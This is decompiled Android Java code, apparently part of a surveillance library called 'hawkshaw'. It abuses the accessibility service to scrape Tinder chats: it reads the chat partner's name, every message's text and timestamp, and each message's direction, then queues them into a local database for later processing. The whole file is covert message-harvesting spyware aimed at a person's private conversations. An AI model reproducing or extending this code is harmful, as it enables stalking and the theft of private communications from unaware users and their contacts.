package com.hawkshaw.library.features.accessibility.socialmedia;

import M1.a;
import Y1.K;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.core.app.NotificationCompat;
import com.hawkshaw.library.datalayer.models.PackageName;
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity;
import com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity;
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt;
import com.hawkshaw.library.ktextensions.StringsKt;
import j3.f;
import java.util.concurrent.ExecutorService;
import r3.j;

public final class Tinder {
    public static final Tinder INSTANCE = new Tinder();

    /* renamed from: p  reason: collision with root package name */
    private static final String f4968p = "com.tinder:id";

    private Tinder() {
    }

    /* access modifiers changed from: private */
    public static final void extractMessages$lambda$0(UnprocessedSocialMediaEntity unprocessedSocialMediaEntity) {
        K.n(unprocessedSocialMediaEntity, "$entity");
        HandlerKt.insert(unprocessedSocialMediaEntity);
    }

    public final void extractMessages(AccessibilityEvent accessibilityEvent, ExecutorService executorService) {
        AccessibilityNodeInfo source;
        AccessibilityNodeInfo findFirst;
        ExecutorService executorService2 = executorService;
        K.n(accessibilityEvent, NotificationCompat.CATEGORY_EVENT);
        K.n(executorService2, "executor");
        if (K.f(accessibilityEvent.getPackageName(), "com.tinder.chat.activity.ChatActivity") && (source = accessibilityEvent.getSource()) != null) {
            Researcher researcher = Researcher.INSTANCE;
            researcher.print("\n \n \n ");
            Researcher.printTree$default(researcher, source, 0, 2, (Object) null);
            AccessibilityNodeInfo findFirst2 = AccessibilityUtilsKt.findFirst(source, "com.tinder:id/textViewName");
            CharSequence text = findFirst2 != null ? findFirst2.getText() : null;
            if (text != null && (findFirst = AccessibilityUtilsKt.findFirst(source, "com.tinder:id/chat_recycler_view")) != null) {
                int childCount = findFirst.getChildCount();
                String str = "";
                for (int i5 = 0; i5 < childCount; i5++) {
                    AccessibilityNodeInfo child = findFirst.getChild(i5);
                    K.k(child);
                    AccessibilityNodeInfo findFirst3 = AccessibilityUtilsKt.findFirst(child, "com.tinder:id/layout_chat_message_timestamp");
                    CharSequence text2 = findFirst3 != null ? findFirst3.getText() : null;
                    AccessibilityNodeInfo findFirst4 = AccessibilityUtilsKt.findFirst(child, "com.tinder:id/chatTextMessageContent");
                    CharSequence text3 = findFirst4 != null ? findFirst4.getText() : null;
                    if (text2 != null || text3 != null) {
                        if (text2 != null && !j.U(text2)) {
                            str = StringsKt.getEmpty(text2);
                        }
                        SocialMediaEntity.Type type = AccessibilityUtilsKt.findFirst(child, "com.tinder:id/chatMessageAvatar") == null ? SocialMediaEntity.Type.Sent : SocialMediaEntity.Type.Received;
                        PackageName packageName = PackageName.TINDER;
                        executorService2.execute(new a(new UnprocessedSocialMediaEntity(StringsKt.hash(text + "-" + text3 + "-" + str + "-" + packageName), StringsKt.getEmpty(text), (String) null, (String) null, StringsKt.getEmpty(text3), type, packageName, str, false, 256, (f) null), 2));
                    }
                }
            }
        }
    }
}
